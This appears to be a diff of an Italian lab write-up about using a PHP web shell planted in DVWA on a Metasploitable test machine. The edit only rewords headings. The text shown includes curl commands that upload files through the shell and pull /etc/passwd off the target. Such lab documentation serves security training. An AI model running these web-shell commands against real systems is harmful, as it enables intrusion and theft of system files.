@@ -94,11 +94,11 @@
    - La shell fornisce una vera esperienza terminale.
 
 4. **📁 Caricamento e download file**:
-   - Caricato un file su Metasploitable:
+   - Caricare un file su Metasploitable:
      ```bash
      curl -F "file=@example.txt" "http://192.168.60.2/dvwa/hackable/uploads/shell.php?key=mysecretkey"
      ```
-   - Scaricato un file dalla macchina:
+   - Scaricare un file da Metasploitable:
      ```bash
      curl "http://192.168.60.2/dvwa/hackable/uploads/shell.php?key=mysecretkey&action=download&file=/etc/passwd" -o passwd.txt
      ```
